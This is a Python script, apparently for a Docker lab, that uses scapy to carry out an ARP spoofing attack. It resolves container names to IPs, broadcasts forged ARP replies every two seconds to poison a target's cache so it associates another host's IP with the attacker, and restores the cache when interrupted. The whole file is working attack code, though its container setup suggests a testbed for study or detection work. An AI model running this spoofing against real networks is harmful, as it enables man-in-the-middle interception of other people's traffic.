from getmac import get_mac_address as gma
from scapy.all import ARP, send, sr, conf
import time
import socket
import logging

# Disable MAC address warning (because we are sending it via broadcast address)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def arp_spoof(target_ip, spoof_ip, iface):
    """Simluates an ARP spoofing attack"""
    # Fake ARP packet (with broadcast MAC to send everyone the fake ARP)
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    print(f"[INFO] Sending spoof ARP packets to {target_ip}, faking {spoof_ip}", flush=True)
    
    try:
        while True:
            send(packet, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_network(target_ip, spoof_ip)

def restore_network(target_ip, spoof_ip):
    """Restores the ARP cache to the normal setting"""
    real_mac = get_mac(spoof_ip)
    target_mac = get_mac(target_ip)

    restore_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=real_mac)
    send(restore_packet, verbose=False)
    
    print(f"[INFO] Network restored between {target_ip} and {spoof_ip}", flush=True)

def get_mac(ip):
    """Resolve the MAC address of a given IP"""
    response, _ = sr(ARP(op=1, pdst=ip), timeout=2, verbose=False)
    if response:
        return response[0][1].hwsrc
    else:
        print(f"[ERROR] Couldn't resolve MAC for {ip}", flush=True)
        return None

def get_ip(container_name):
    """Resolve the IP address of a container by its name."""
    try:
        return socket.gethostbyname(container_name)
    except socket.gaierror as e:
        print(f"[ERROR] Unable to resolve IP for {container_name}: {e}", flush=True)
        return None


if __name__ == "__main__":
    print(f"The ARP spoofer's MAC address: {gma()}", flush=True)

    # Resolve Docker container names to IPs
    target_container_name = "target-container"
    spoof_container_name = "downstream-container"

    target_ip = get_ip(target_container_name)
    spoof_ip = get_ip(spoof_container_name)

    # Interface inside the Docker container
    iface = "eth0"

    if not target_ip or not spoof_ip:
        print("[ERROR] Could not resolve container IPs!", flush=True)
        exit(1)

    print(f"[INFO] Target IP: {target_ip}", flush=True)
    print(f"[INFO] Spoof IP: {spoof_ip}", flush=True)
    
    arp_spoof(target_ip, spoof_ip, iface)
